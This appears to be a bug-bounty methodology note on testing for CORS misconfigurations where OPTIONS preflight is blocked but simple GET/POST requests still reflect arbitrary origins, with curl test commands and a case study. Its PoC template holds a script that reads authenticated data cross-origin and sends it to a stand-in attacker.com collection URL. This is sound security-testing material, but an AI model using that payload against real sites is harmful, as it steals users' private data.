---
type: pattern
title: Pattern - CORS Simple Request vs Preflight Bypass
tags: [pattern, cors, simple-request, preflight, options-403, bypass, bb-pattern]
status: active
vuln_class: cors-misconfiguration
last_updated: 2026-06-04
---

# Pattern — CORS Simple Request vs Preflight Bypass

> OPTIONS 403 ≠ CORS blocked. Simple requests (GET/POST without custom headers) skip preflight entirely. Always test both paths separately.

## Core Concept

The CORS spec splits requests into two categories:

| Type | Trigger condition | Browser behavior |
|------|---------|-----------|
| **Simple Request** | GET/POST + standard content-type + no custom headers | **Sent directly, no OPTIONS preflight** |
| **Preflighted Request** | Any custom header (e.g. `Authorization`), non-standard method, or non-standard content-type | An OPTIONS preflight is sent first; a 403 blocks the actual request |

**The key trap**: testing CORS by sending only an OPTIONS request and getting a 403 leads to the conclusion "CORS is safe" — that conclusion is wrong. A simple request completely bypasses preflight and reaches the backend directly; if the backend responds with `Access-Control-Allow-Origin: <evil>`, it's still exploitable.

### Which Requests Qualify as Simple Requests (per RFC)

- Method: `GET`, `POST`, `HEAD`
- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`
- No custom request headers (no `Authorization`, `X-Custom-*`, etc.)

## Test Matrix

Every CORS target must be tested along both paths:

```bash
TARGET="https://api.example.com/v1/endpoint"
EVIL_ORIGIN="https://evil.com"

# Path A: OPTIONS preflight (the traditional test)
curl -si -X OPTIONS "$TARGET" \
  -H "Origin: $EVIL_ORIGIN" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  | grep -i "access-control\|HTTP/"

# Path B: Simple GET (bypasses preflight)
curl -si -X GET "$TARGET" \
  -H "Origin: $EVIL_ORIGIN" \
  | grep -i "access-control\|HTTP/"

# Path C: Simple POST (text/plain, doesn't trigger preflight)
curl -si -X POST "$TARGET" \
  -H "Origin: $EVIL_ORIGIN" \
  -H "Content-Type: text/plain" \
  -d "data=test" \
  | grep -i "access-control\|HTTP/"
```

### Decision Logic

```
OPTIONS → 403?
  ↓ yes → doesn't mean it's safe, keep going
GET/POST (no custom headers) + Origin: evil.com
  ↓
Response includes Access-Control-Allow-Origin: evil.com + ACAC: true?
  ↓ yes → Simple-request CORS bypass confirmed
    ↓
    Auth uses Cookie + SameSite=None? → ✅ exploitable (P2)
    Auth uses Bearer JWT?             → ⚠️ misconfig only (Low)
```

## Real-World Case Study

### OPTIONS 403 but GET Reflects Any Origin (public H1 report, 2026-05)

**Endpoints**: internal API subdomains behind Cloudflare Access

```bash
# OPTIONS → 403 (looks like CORS is blocked)
curl -si -X OPTIONS "https://internal-api.example.com/api/v1/data" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET"
# HTTP/2 403

# Simple GET request → Origin is reflected (the actual vulnerability)
curl -si "https://internal-api.example.com/api/v1/data" \
  -H "Origin: https://evil.com"
# access-control-allow-origin: https://evil.com
# access-control-allow-credentials: true

# Multiple origins all reflected
curl -si "..." -H "Origin: https://notexample.com"
# access-control-allow-origin: https://notexample.com
# access-control-allow-credentials: true

curl -si "..." -H "Origin: https://example.evil.com"
# access-control-allow-origin: https://example.evil.com
# access-control-allow-credentials: true
```

**Auth**: a Cloudflare Access JWT cookie, `SameSite=None` (an architectural default of CF Access)

**Conclusion**: OPTIONS 403 produced a false negative — only testing a simple GET revealed that any origin was reflected with ACAC:true. Because CF Access forces `SameSite=None`, this was fully exploitable.

## PoC Template (Simple-Request CORS Bypass)

```html
<!-- attacker.com/poc.html -->
<script>
fetch('https://api.target.com/v1/sensitive-data', {
  method: 'GET',
  credentials: 'include'
  // Note: no Authorization header — keeps this a simple request
})
.then(r => r.json())
.then(data => {
  // data has been read cross-origin
  fetch('https://attacker.com/collect?d=' + encodeURIComponent(JSON.stringify(data)));
});
</script>
```

## Why OPTIONS 403 Doesn't Mean Safe

Backend CORS handling is frequently split across layers:
- OPTIONS is intercepted by a WAF/reverse proxy (returns 403)
- GET/POST requests reach the application server directly, which adds CORS headers at the app layer
- The two layers behave inconsistently → preflight is blocked but the actual request goes through

Common architectures where this happens:
- Cloudflare WAF / CF Access: OPTIONS is blocked at the CF layer, GET is handled by the origin server
- nginx + Spring Boot: nginx intercepts OPTIONS, Spring Boot adds CORS headers on the GET response
- API Gateway + Lambda: OPTIONS goes through a mock response (403), GET triggers the Lambda (which has CORS headers)

## Impact Boundaries

| Attack scenario | Exploitable | Condition |
|---------|--------|------|
| Read an auth-required API (cookie auth) | ✅ | SameSite=None |
| Read an auth-required API (Bearer JWT) | ❌ | Bearer must be set via JS; a simple request can't carry it |
| Read a public API (no auth) | ⚠️ | No credentials to steal, usually Info only |
| POST state-changing action (CSRF) | ✅ | Needs a `text/plain`-eligible body, or cookie auth + SameSite=None |

## Pre-Test Checklist

- [ ] **Path A**: record the OPTIONS preflight result
- [ ] **Path B**: record the GET + Origin header result
- [ ] **Path C**: record the POST + `text/plain` + Origin header result (for state-changing endpoints)
- [ ] If A=403 but B/C reflect → confirm whether ACAC is true
- [ ] Confirm the auth mechanism (cookie vs Bearer) — see [[Pattern - CORS Misconfiguration]] for the full exploitability decision tree

## Submission Notes

1. Explicitly state in the report that "OPTIONS 403 does not mean simple requests are also blocked"
2. Attach both the OPTIONS 403 curl output (counter-evidence) and the GET-reflection curl output (positive evidence)
3. Describe which origins are reflected (arbitrary / regex bypass / specific subdomain)
4. If the OPTIONS 403 comes from a WAF/CF layer, explain the architectural split

## Related Patterns

- [[Pattern - CORS Misconfiguration]] — the parent pattern; contains the full exploitability decision tree (cookie vs Bearer, SameSite)
- [[Pattern - CORS ACAC True with Bearer Auth]] — the case where a simple-request bypass exists but auth is Bearer JWT → downgrade to Low

## Lesson References

- OPTIONS 403 does not imply safety — a simple GET/POST request bypasses preflight entirely and must always be tested separately.
- A cross-eTLD+1 relationship is a high-confidence signal that SameSite=None is in effect.
